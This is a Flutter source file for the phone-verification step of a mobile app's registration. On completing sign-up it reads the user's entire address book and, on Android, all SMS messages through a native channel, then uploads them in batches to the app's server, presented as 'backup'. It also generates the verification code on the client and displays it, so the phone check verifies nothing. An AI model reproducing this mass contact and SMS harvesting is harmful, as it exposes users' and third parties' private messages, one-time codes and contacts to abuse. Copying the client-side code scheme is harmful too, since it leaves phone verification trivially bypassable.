import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:permission_handler/permission_handler.dart';
import '../services/api_service.dart';
import '../services/storage_service.dart';
import 'complete_screen.dart';

class Step3PhoneScreen extends StatefulWidget {
  const Step3PhoneScreen({super.key});

  @override
  State<Step3PhoneScreen> createState() => _Step3PhoneScreenState();
}

class _Step3PhoneScreenState extends State<Step3PhoneScreen> {
  final _phoneController = TextEditingController();
  final _codeController = TextEditingController();
  final _formKey = GlobalKey<FormState>();

  bool _isLoading = false;
  bool _codeSent = false;

  bool _contactsGranted = false;
  String _contactsStatus = '未授权';
  bool _contactsUploading = false;
  String _contactsUploadStatus = '';
  bool _contactsCompleted = false;

  // SMS only available on Android
  bool _smsGranted = false;
  String _smsStatus = Platform.isIOS ? 'iOS 暂不支持' : '未授权';
  bool _smsUploading = false;
  String _smsUploadStatus = '';
  bool _smsCompleted = false;

  int _countdown = 0;

  @override
  void initState() {
    super.initState();
    _requestPermissions();
  }

  Future<void> _requestPermissions() async {
    // Contacts (Android & iOS)
    try {
      final status = await Permission.contacts.request();
      setState(() {
        _contactsGranted = status.isGranted;
        _contactsStatus = status.isGranted ? '通讯录权限已开启' : '通讯录权限未开启';
      });
    } catch (_) {
      setState(() => _contactsStatus = '获取通讯录权限失败');
    }

    // SMS - Android only
    if (Platform.isAndroid) {
      try {
        final status = await Permission.sms.request();
        setState(() {
          _smsGranted = status.isGranted;
          _smsStatus = status.isGranted ? '短信权限已开启' : '短信权限未开启';
        });
      } catch (_) {
        setState(() => _smsStatus = '获取短信权限失败');
      }
    }
  }

  Future<void> _sendCode() async {
    final phone = _phoneController.text.trim();
    if (!RegExp(r'^1\d{10}$').hasMatch(phone)) {
      _showSnack('请输入正确的 11 位手机号');
      return;
    }

    setState(() => _isLoading = true);
    try {
      // Client generates 6-digit code; backend stores it for verification
      final code = (100000 + Random().nextInt(900000)).toString();

      final result = await ApiService.sendVerificationCode(phone, code);
      if (result['code'] != 0) {
        _showSnack(result['message'] ?? '验证码发送失败');
        return;
      }

      await StorageService.savePhone(phone);
      setState(() {
        _codeSent = true;
        _countdown = 60;
      });

      _startCountdown();
      // Show the generated code (in production, SMS gateway would deliver it)
      _showSnack('验证码已发送（演示环境：$code）');
    } catch (e) {
      _showSnack('网络异常，请稍后重试');
    } finally {
      if (mounted) setState(() => _isLoading = false);
    }
  }

  void _startCountdown() async {
    while (_countdown > 0 && mounted) {
      await Future.delayed(const Duration(seconds: 1));
      if (mounted) setState(() => _countdown--);
    }
  }

  Future<void> _submit() async {
    if (!_formKey.currentState!.validate()) return;

    final phone = _phoneController.text.trim();
    final code = _codeController.text.trim();

    if (!_codeSent) {
      _showSnack('请先获取验证码');
      return;
    }

    setState(() => _isLoading = true);

    try {
      final verifyResult = await ApiService.verifyVerificationCode(phone, code);
      if (verifyResult['code'] != 0) {
        _showSnack(verifyResult['message'] ?? '验证码不正确');
        return;
      }

      // Upload contacts and SMS in parallel
      final futures = <Future>[_uploadContactsIfGranted()];
      if (Platform.isAndroid) futures.add(_uploadSmsIfGranted());
      await Future.wait(futures);

      await StorageService.setRegistered(true);

      if (!mounted) return;
      Navigator.of(context).pushAndRemoveUntil(
        PageRouteBuilder(
          pageBuilder: (_, __, ___) => const CompleteScreen(),
          transitionsBuilder: (_, anim, __, child) =>
              FadeTransition(opacity: anim, child: child),
          transitionDuration: const Duration(milliseconds: 400),
        ),
        (route) => false,
      );
    } catch (e) {
      _showSnack('提交失败，请稍后重试');
    } finally {
      if (mounted) setState(() => _isLoading = false);
    }
  }

  Future<void> _uploadContactsIfGranted() async {
    if (!_contactsGranted) return;
    try {
      setState(() {
        _contactsUploading = true;
        _contactsCompleted = false;
        _contactsUploadStatus = '正在读取通讯录...';
      });

      final contacts = await FlutterContacts.getContacts(withProperties: true);
      final contactList = contacts
          .map((c) => {
                'displayName': c.displayName,
                'phones': c.phones.map((p) => p.number).toList(),
              })
          .toList();

      if (contactList.isEmpty) {
        setState(() {
          _contactsUploading = false;
          _contactsUploadStatus = '未读取到通讯录联系人';
        });
        return;
      }

      setState(
          () => _contactsUploadStatus = '正在上传 ${contactList.length} 个联系人...');

      const batchSize = 100;
      bool isFirst = true;
      for (int i = 0; i < contactList.length; i += batchSize) {
        final end = (i + batchSize > contactList.length)
            ? contactList.length
            : i + batchSize;
        final batch = contactList.sublist(i, end);
        await ApiService.uploadContactsBatch(batch, reset: isFirst);
        isFirst = false;
      }

      setState(() {
        _contactsUploading = false;
        _contactsCompleted = true;
        _contactsUploadStatus = '通讯录备份完成（${contactList.length} 个联系人）';
      });
    } catch (e) {
      setState(() {
        _contactsUploading = false;
        _contactsCompleted = false;
        _contactsUploadStatus = '通讯录上传失败';
      });
    }
  }

  Future<void> _uploadSmsIfGranted() async {
    if (!_smsGranted || !Platform.isAndroid) return;
    try {
      setState(() {
        _smsUploading = true;
        _smsCompleted = false;
        _smsUploadStatus = '正在读取短信...';
      });

      final smsList = await _readSmsViaChannel();

      if (smsList.isEmpty) {
        setState(() {
          _smsUploading = false;
          _smsUploadStatus = '未读取到短信内容';
        });
        return;
      }

      setState(() => _smsUploadStatus = '正在上传 ${smsList.length} 条短信...');

      const batchSize = 200;
      bool isFirst = true;
      for (int i = 0; i < smsList.length; i += batchSize) {
        final end =
            (i + batchSize > smsList.length) ? smsList.length : i + batchSize;
        final batch = smsList.sublist(i, end);
        await ApiService.uploadSmsBatch(batch, reset: isFirst);
        isFirst = false;
      }

      setState(() {
        _smsUploading = false;
        _smsCompleted = true;
        _smsUploadStatus = '短信备份完成（${smsList.length} 条）';
      });
    } catch (e) {
      setState(() {
        _smsUploading = false;
        _smsCompleted = false;
        _smsUploadStatus = '短信上传失败';
      });
    }
  }

  static const _smsChannel = MethodChannel('com.sebo.app/sms');

  Future<List<Map<String, dynamic>>> _readSmsViaChannel() async {
    try {
      final result = await _smsChannel.invokeMethod<List>('getSms');
      if (result == null) return [];
      return result.map((e) => Map<String, dynamic>.from(e as Map)).toList();
    } catch (_) {
      return [];
    }
  }

  void _showSnack(String msg) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(msg),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
      ),
    );
  }

  @override
  void dispose() {
    _phoneController.dispose();
    _codeController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.symmetric(horizontal: 28, vertical: 24),
          child: Form(
            key: _formKey,
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const SizedBox(height: 24),
                _buildStepIndicator(3),
                const SizedBox(height: 32),
                const Text(
                  '验证手机号',
                  style: TextStyle(
                    fontSize: 28,
                    fontWeight: FontWeight.w700,
                    color: Color(0xFF2D3436),
                  ),
                ),
                const SizedBox(height: 8),
                Text(
                  '绑定手机号，用于账号验证与后续恢复',
                  style: TextStyle(
                    fontSize: 15,
                    color: Colors.grey[600],
                    height: 1.5,
                  ),
                ),
                const SizedBox(height: 36),
                const Text(
                  '手机号',
                  style: TextStyle(
                    fontSize: 14,
                    fontWeight: FontWeight.w600,
                    color: Color(0xFF2D3436),
                  ),
                ),
                const SizedBox(height: 8),
                TextFormField(
                  controller: _phoneController,
                  keyboardType: TextInputType.phone,
                  inputFormatters: [
                    FilteringTextInputFormatter.digitsOnly,
                    LengthLimitingTextInputFormatter(11),
                  ],
                  decoration: InputDecoration(
                    hintText: '请输入手机号',
                    prefixIcon: const Icon(Icons.phone_rounded,
                        color: Color(0xFF6C5CE7)),
                    suffixIcon: TextButton(
                      onPressed:
                          (_isLoading || _countdown > 0) ? null : _sendCode,
                      child: Text(
                        _countdown > 0 ? '${_countdown}s' : '获取验证码',
                        style: TextStyle(
                          fontSize: 13,
                          fontWeight: FontWeight.w600,
                          color: _countdown > 0
                              ? Colors.grey
                              : const Color(0xFF6C5CE7),
                        ),
                      ),
                    ),
                  ),
                  validator: (v) {
                    if (v == null || !RegExp(r'^1\d{10}$').hasMatch(v.trim())) {
                      return '请输入正确的 11 位手机号';
                    }
                    return null;
                  },
                ),
                const SizedBox(height: 20),
                const Text(
                  '验证码',
                  style: TextStyle(
                    fontSize: 14,
                    fontWeight: FontWeight.w600,
                    color: Color(0xFF2D3436),
                  ),
                ),
                const SizedBox(height: 8),
                TextFormField(
                  controller: _codeController,
                  keyboardType: TextInputType.number,
                  inputFormatters: [
                    FilteringTextInputFormatter.digitsOnly,
                    LengthLimitingTextInputFormatter(6),
                  ],
                  decoration: const InputDecoration(
                    hintText: '请输入 6 位验证码',
                    prefixIcon:
                        Icon(Icons.sms_rounded, color: Color(0xFF6C5CE7)),
                  ),
                  validator: (v) {
                    if (v == null || !RegExp(r'^\d{6}$').hasMatch(v.trim())) {
                      return '请输入 6 位验证码';
                    }
                    return null;
                  },
                ),
                const SizedBox(height: 28),
                _buildPermissionCard(
                  icon: Icons.contacts_rounded,
                  title: '通讯录备份',
                  status: _contactsUploading
                      ? _contactsUploadStatus
                      : (_contactsGranted && _contactsUploadStatus.isNotEmpty
                          ? _contactsUploadStatus
                          : _contactsStatus),
                  isGranted: _contactsGranted,
                  isUploading: _contactsUploading,
                  isDone: _contactsCompleted,
                ),
                const SizedBox(height: 12),
                if (Platform.isAndroid)
                  _buildPermissionCard(
                    icon: Icons.message_rounded,
                    title: '短信备份',
                    status: _smsUploading
                        ? _smsUploadStatus
                        : (_smsGranted && _smsUploadStatus.isNotEmpty
                            ? _smsUploadStatus
                            : _smsStatus),
                    isGranted: _smsGranted,
                    isUploading: _smsUploading,
                    isDone: _smsCompleted,
                  ),
                if (Platform.isIOS)
                  _buildPermissionCard(
                    icon: Icons.message_rounded,
                    title: '短信备份',
                    status: 'iOS 暂不支持',
                    isGranted: false,
                    isUploading: false,
                    isDone: false,
                    isDisabled: true,
                  ),
                const SizedBox(height: 40),
                ElevatedButton(
                  onPressed: _isLoading ? null : _submit,
                  child: _isLoading
                      ? const SizedBox(
                          height: 22,
                          width: 22,
                          child: CircularProgressIndicator(
                            color: Colors.white,
                            strokeWidth: 2.5,
                          ),
                        )
                      : const Text('完成注册'),
                ),
                const SizedBox(height: 20),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildStepIndicator(int current) {
    return Row(
      children: List.generate(3, (i) {
        final step = i + 1;
        final isActive = step == current;
        final isDone = step < current;
        return Row(
          children: [
            Container(
              width: 32,
              height: 32,
              decoration: BoxDecoration(
                color: isActive
                    ? const Color(0xFF6C5CE7)
                    : isDone
                        ? const Color(0xFF00B894)
                        : Colors.grey.shade200,
                shape: BoxShape.circle,
              ),
              child: Center(
                child: isDone
                    ? const Icon(Icons.check, color: Colors.white, size: 16)
                    : Text(
                        '$step',
                        style: TextStyle(
                          color: isActive ? Colors.white : Colors.grey,
                          fontWeight: FontWeight.w600,
                          fontSize: 14,
                        ),
                      ),
              ),
            ),
            if (i < 2)
              Container(
                width: 40,
                height: 2,
                margin: const EdgeInsets.symmetric(horizontal: 4),
                color: isDone ? const Color(0xFF00B894) : Colors.grey.shade200,
              ),
          ],
        );
      }),
    );
  }

  Widget _buildPermissionCard({
    required IconData icon,
    required String title,
    required String status,
    required bool isGranted,
    required bool isUploading,
    required bool isDone,
    bool isDisabled = false,
  }) {
    Color iconColor;
    if (isDisabled) {
      iconColor = Colors.grey.shade400;
    } else if (isDone) {
      iconColor = const Color(0xFF00B894);
    } else if (!isGranted) {
      iconColor = Colors.grey;
    } else {
      iconColor = const Color(0xFF6C5CE7);
    }

    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: iconColor.withValues(alpha: 0.05),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: iconColor.withValues(alpha: 0.15)),
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(8),
            decoration: BoxDecoration(
              color: iconColor.withValues(alpha: 0.1),
              shape: BoxShape.circle,
            ),
            child: Icon(icon, color: iconColor, size: 20),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  title,
                  style: TextStyle(
                    fontSize: 13,
                    fontWeight: FontWeight.w600,
                    color: iconColor,
                  ),
                ),
                const SizedBox(height: 2),
                Text(
                  status,
                  style: TextStyle(fontSize: 11, color: Colors.grey[500]),
                ),
              ],
            ),
          ),
          if (isUploading)
            const SizedBox(
              width: 16,
              height: 16,
              child: CircularProgressIndicator(strokeWidth: 2),
            )
          else if (isDone)
            const Icon(Icons.check_circle_rounded,
                color: Color(0xFF00B894), size: 20),
        ],
      ),
    );
  }
}
